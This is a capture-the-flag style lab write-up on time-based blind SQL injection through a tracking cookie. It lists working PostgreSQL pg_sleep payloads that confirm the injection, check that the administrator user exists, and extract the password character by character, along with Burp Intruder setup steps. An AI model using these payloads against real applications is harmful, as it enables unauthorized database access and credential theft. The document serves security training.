Title: Blind SQL injection with time delays and information retrieval
Level: Practitioner
Desc:  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

payload: `TrackingId=QHvH9SEulpOJRGZ7' || pg_sleep(10)--`
result: we have 10 sec sleep

payload: `TrackingId=QHvH9SEulpOJRGZ7'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
result: we have sleep

payload: `TrackingId=QHvH9SEulpOJRGZ7'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
result: we have sleep - administrator exists

payload: `TrackingId=QHvH9SEulpOJRGZ7'%3BSELECT CASE WHEN (username='xadministrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
result: no sleep

TO GET PASSWORD char by char:
payload: `TrackingId=QHvH9SEulpOJRGZ7'%3BSELECT CASE WHEN SUBSTR(password,1,1)='3' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator'--`

To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible,
you need to configure the Intruder attack to issue requests in a single thread. To do this, click the Resource pool tab to open the Resource pool side panel and add the attack to a resource pool
with the Maximum concurrent requests set to 1
![image](https://github.com/user-attachments/assets/05db3847-bb9d-4dad-9444-7a36fd66dd2a)


Review the attack results to find the value of the character at the first position. You should see a column in the results called Response received. This will generally contain a small number,
representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing
for that row is the value of the character at the first position. 

3v46ts3
















